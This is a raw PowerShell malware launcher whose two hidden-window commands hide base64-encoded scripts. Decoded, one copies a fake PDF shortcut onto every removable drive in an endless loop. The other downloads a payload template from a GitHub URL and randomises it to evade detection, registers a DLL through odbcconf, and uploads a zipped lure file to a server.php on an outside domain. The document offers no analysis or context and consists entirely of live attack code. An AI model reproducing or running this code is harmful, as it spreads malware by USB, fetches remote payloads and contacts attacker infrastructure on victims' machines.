start-process powershell.exe -Argument "-w 1 -enc dwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQAgAHsAIAAkAGQAcgBpAHYAZQBwAGEAdABoACAAPQAgACgARwBlAHQALQBXAG0AaQBPAGIAagBlAGMAdAAgAC0AQwBsAGEAcwBzACAAVwBpAG4AMwAyAF8ATABvAGcAaQBjAGEAbABEAGkAcwBrACAAfAAgAFcAaABlAHIAZQAtAE8AYgBqAGUAYwB0ACAAewAgACQAXwAuAEQAcgBpAHYAZQBUAHkAcABlACAALQBlAHEAIAAyACAAfQApAC4ARABlAHYAaQBjAGUASQBEADsAIABpAGYAIAAoACQAZAByAGkAdgBlAHAAYQB0AGgAIAAtAGEAbgBkACAALQBuAG8AdAAgACgAVABlAHMAdAAtAFAAYQB0AGgAIAAiACQAZAByAGkAdgBlAHAAYQB0AGgAXABEAE8ASwBVAE0ARQBOAF8AUABFAE4AVABJAE4ARwBfAFIAQQBIAEEAUwBJAEEALgBwAGQAZgAuAGwAbgBrACIAKQApACAAewAgAGMAbwBwAHkALQBpAHQAZQBtACAALQBQAGEAdABoACAAJABlAG4AdgA6AHQAbQBwAFwAQgB1AGsAdABpAF8AQgBhAHkAYQByAC4AcABkAGYALgBsAG4AawAgAC0ARABlAHMAdABpAG4AYQB0AGkAbwBuACAAJABkAHIAaQB2AGUAcABhAHQAaABcAEQATwBLAFUATQBFAE4AXwBQAEUATgBUAEkATgBHAF8AUgBBAEgAQQBTAEkAQQAuAHAAZABmAC4AbABuAGsAIAB9ADsAIABTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAzADAAMAAgAH0A" ; start-process powershell.exe -Argument "-w 1 iex([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('d2hpbGUgKFRlc3QtUGF0aCAiJGVudjp0bXBcbG5rY21kLmRsbCIpIHsNClNldC1Mb2NhdGlvbiAtUGF0aCAkZW52OlRNUA0KDQokTmFtYUZpbGU9IkJ1a3RpX0JheWFyIg0KcmVtb3ZlLWl0ZW0gIiRFTlY6VE1QXCROYW1hRmlsZS5wZGYubG5rIg0KcmVtb3ZlLWl0ZW0gIiRFTlY6VE1QXCROYW1hRmlsZS56aXAiDQpzdGFydC1zbGVlcCAyDQoNCmVjaG8gMSA+ICIkRU5WOlRNUFwkTmFtYUZpbGUuemlwIg0KDQpzdGFydC1zbGVlcCAxDQoNCiR1PSJodHRwczovL2Rzb3NhdGFyYS5jby5pbi9tb2JpbGUvYWRtaW4vaW1hZ2VzL2tyaWRhX2ltZy84ODc1NTE1NXNlcnZlci5waHAiOyRmPSIkZW52OlRNUFxCdWt0aV9CYXlhci56aXAiDQokYj0iLS0tLVdlYktpdEZvcm1Cb3VuZGFyeSIrW1N5c3RlbS5HdWlkXTo6TmV3R3VpZCgpLlRvU3RyaW5nKCJOIikNCiRoPSJtdWx0aXBhcnQvZm9ybS1kYXRhOyBib3VuZGFyeT0kYiINCiRjPSItLSRiYHJgbkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT1gImZpbGVgIjsgZmlsZW5hbWU9YCJCdWt0aV9CYXlhci56aXBgImByYG5Db250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbWByYG5gcmBuIg0KJGJkPVtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJGMpKyhHZXQtQ29udGVudCAkZiAtRW5jb2RpbmcgQnl0ZSkrW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygiYHJgbi0tJGItLWByYG4iKQ0KJHI9W1N5c3RlbS5OZXQuSHR0cFdlYlJlcXVlc3RdOjpDcmVhdGUoJHUpOyRyLk1ldGhvZD0iUE9TVCI7JHIuQ29udGVudFR5cGU9JGg7JHIuQ29udGVudExlbmd0aD0kYmQuTGVuZ3RoDQokcz0kci5HZXRSZXF1ZXN0U3RyZWFtKCk7JHMuV3JpdGUoJGJkLDAsJGJkLkxlbmd0aCk7JHMuQ2xvc2UoKQ0KW1N5c3RlbS5JTy5TdHJlYW1SZWFkZXJdOjpuZXcoJHIuR2V0UmVzcG9uc2UoKS5HZXRSZXNwb25zZVN0cmVhbSgpKS5SZWFkVG9FbmQoKQ0KDQpzdGFydC1zbGVlcCAxDQpyZW1vdmUtaXRlbSAiJEVOVjpUTVBcJE5hbWFGaWxlLnppcCINCnN0YXJ0LXNsZWVwIDENCg0KJGlucHV0RmlsZSA9ICIkZW52OlRNUFxQYXlsb2FkTW9ycGgudHh0Ig0KDQpJbnZva2UtV2ViUmVxdWVzdCAtVXJpICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vMXgzay8xL3JlZnMvaGVhZHMvbWFpbi9QYXlsb2FkTW9ycGgudHh0IiAtT3V0RmlsZSAkaW5wdXRGaWxlDQoNCiRvdXRwdXRGaWxlID0gIiRFTlY6VE1QXFBheWxvYWRNb3JwaDIudHh0Ig0KDQoNCmZ1bmN0aW9uIEdlbmVyYXRlLVJhbmRvbVN0cmluZyB7DQogICAgcGFyYW0gKCRsZW5ndGgpDQogICAgJGNoYXJzID0gJzAxMjM0NTY3ODknDQogICAgJHJhbmRvbSA9IC1qb2luICgoMS4uJGxlbmd0aCkgfCBGb3JFYWNoLU9iamVjdCB7ICRjaGFyc1soR2V0LVJhbmRvbSAtTWluaW11bSAwIC1NYXhpbXVtICRjaGFycy5MZW5ndGgpXSB9KQ0KICAgIHJldHVybiAkcmFuZG9tDQp9DQoNCg0KJGxpbmVzID0gR2V0LUNvbnRlbnQgJGlucHV0RmlsZQ0KDQoNCiRhbHBoYWJldCA9IEAoJ0EnLCAnQicsICdDJywgJ0QnLCAnRScsICdGJywgJ0cnLCAnSCcsICdJJywgJ0onLCAnSycsICdMJywgJ00nLCAnTicsICdPJywgJ1AnLCAnUScsICdSJywgJ1MnLCAnVCcsICdVJywgJ1YnLCAnVycsICdYJywgJ1knLCAnWicpDQoNCg0KJHByb2Nlc3NlZExpbmVzID0gJGxpbmVzIHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICRsaW5lID0gJF8NCg0KICAgIA0KICAgIGZvcmVhY2ggKCRsZXR0ZXIgaW4gJGFscGhhYmV0KSB7DQogICAgICAgIA0KICAgICAgICAkcmFuZG9tTGV0dGVyID0gJGFscGhhYmV0IHwgR2V0LVJhbmRvbQ0KDQogICAgICAgIA0KICAgICAgICAkbGluZSA9ICRsaW5lIC1yZXBsYWNlICIkbGV0dGVyezMwfSIsICgkcmFuZG9tTGV0dGVyICogMzApDQogICAgfQ0KDQoNCiAgICANCiAgICAxLi45IHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAgICAkdmFyTmFtZSA9ICdWQVInICsgJF8NCiAgICAgICAgJHJhbmRvbUxlbmd0aCA9IEdldC1SYW5kb20gLU1pbmltdW0gMiAtTWF4aW11bSA2DQogICAgICAgICRyYW5kb21TdHJpbmcgPSBHZW5lcmF0ZS1SYW5kb21TdHJpbmcgJHJhbmRvbUxlbmd0aA0KDQogICAgICAgIA0KICAgICAgICB3aGlsZSAoJHByb2Nlc3NlZExpbmVzIC1jb250YWlucyAkcmFuZG9tU3RyaW5nKSB7DQogICAgICAgICAgICAkcmFuZG9tU3RyaW5nID0gR2VuZXJhdGUtUmFuZG9tU3RyaW5nICRyYW5kb21MZW5ndGgNCiAgICAgICAgfQ0KDQogICAgICAgICRsaW5lID0gJGxpbmUgLXJlcGxhY2UgJHZhck5hbWUsICRyYW5kb21TdHJpbmcNCiAgICB9DQoNCiAgICANCiAgICAxLi40IHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAgICAkdmFyTmFtZSA9ICdWQVJSJyArICRfDQogICAgICAgICRyYW5kb21MZW5ndGggPSBHZXQtUmFuZG9tIC1NaW5pbXVtIDIgLU1heGltdW0gNg0KICAgICAgICAkcmFuZG9tU3RyaW5nID0gR2VuZXJhdGUtUmFuZG9tU3RyaW5nICRyYW5kb21MZW5ndGgNCg0KICAgICAgICANCiAgICAgICAgd2hpbGUgKCRwcm9jZXNzZWRMaW5lcyAtY29udGFpbnMgJHJhbmRvbVN0cmluZykgew0KICAgICAgICAgICAgJHJhbmRvbVN0cmluZyA9IEdlbmVyYXRlLVJhbmRvbVN0cmluZyAkcmFuZG9tTGVuZ3RoDQogICAgICAgIH0NCg0KICAgICAgICAkbGluZSA9ICRsaW5lIC1yZXBsYWNlICR2YXJOYW1lLCAkcmFuZG9tU3RyaW5nDQogICAgfQ0KDQogICAgcmV0dXJuICRsaW5lDQp9DQoNCg0KJHByb2Nlc3NlZExpbmVzIHwgU2V0LUNvbnRlbnQgJG91dHB1dEZpbGUNCg0Kc3RhcnQtcHJvY2VzcyBvZGJjY29uZiAtQXJndW1lbnQgIlJFR1NWUiBsbmtjbWQuZGxsIg0Kc3RhcnQtc2xlZXAgMg0KDQptb3ZlLWl0ZW0gIiRFTlY6VE1QXHNob3J0Y3V0LmxuayIgIiRFTlY6VE1QXCROYW1hRmlsZS5wZGYubG5rIg0KDQp0YXIgLWNmICIkRU5WOlRNUFwkTmFtYUZpbGUuemlwIiAtQyAiJEVOVjpUTVAiICIkTmFtYUZpbGUucGRmLmxuayINCg0Kc3RhcnQtc2xlZXAgMg0KDQokdT0iaHR0cHM6Ly9kc29zYXRhcmEuY28uaW4vbW9iaWxlL2FkbWluL2ltYWdlcy9rcmlkYV9pbWcvODg3NTUxNTVzZXJ2ZXIucGhwIjskZj0iJGVudjpUTVBcQnVrdGlfQmF5YXIuemlwIg0KJGI9Ii0tLS1XZWJLaXRGb3JtQm91bmRhcnkiK1tTeXN0ZW0uR3VpZF06Ok5ld0d1aWQoKS5Ub1N0cmluZygiTiIpDQokaD0ibXVsdGlwYXJ0L2Zvcm0tZGF0YTsgYm91bmRhcnk9JGIiDQokYz0iLS0kYmByYG5Db250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9YCJmaWxlYCI7IGZpbGVuYW1lPWAiQnVrdGlfQmF5YXIuemlwYCJgcmBuQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW1gcmBuYHJgbiINCiRiZD1bU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCRjKSsoR2V0LUNvbnRlbnQgJGYgLUVuY29kaW5nIEJ5dGUpK1tTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoImByYG4tLSRiLS1gcmBuIikNCiRyPVtTeXN0ZW0uTmV0Lkh0dHBXZWJSZXF1ZXN0XTo6Q3JlYXRlKCR1KTskci5NZXRob2Q9IlBPU1QiOyRyLkNvbnRlbnRUeXBlPSRoOyRyLkNvbnRlbnRMZW5ndGg9JGJkLkxlbmd0aA0KJHM9JHIuR2V0UmVxdWVzdFN0cmVhbSgpOyRzLldyaXRlKCRiZCwwLCRiZC5MZW5ndGgpOyRzLkNsb3NlKCkNCltTeXN0ZW0uSU8uU3RyZWFtUmVhZGVyXTo6bmV3KCRyLkdldFJlc3BvbnNlKCkuR2V0UmVzcG9uc2VTdHJlYW0oKSkuUmVhZFRvRW5kKCkNCg0KIDsgc3RhcnQtc2xlZXAgMTgwIH0gZXhpdA0K')))"
